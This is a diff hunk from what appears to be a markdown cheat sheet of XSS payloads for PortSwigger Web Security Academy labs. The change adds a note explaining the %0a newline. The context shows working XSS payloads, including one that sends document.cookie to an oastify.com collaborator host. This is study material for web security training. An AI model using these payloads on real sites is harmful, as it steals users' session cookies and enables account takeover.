@@ -334,7 +334,7 @@ https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocume
   
 ### XSS Assign protocol  
 
->Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the **Assignable protocol with location** ```javascript``` identified by [PortSwigger XSS research](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location).  
+>Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the **Assignable protocol with location** ```javascript``` identified by [PortSwigger XSS research](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location). In the payload is the ```%0a``` representing the ASCII newline character.  
 
 ```html
 <script>location.protocol='javascript';</script>#%0adocument.location='http://0xyjdsa2etgbxef5lwgj5rj6mxsoge43.oastify.com/?p='+document.cookie//&context=html
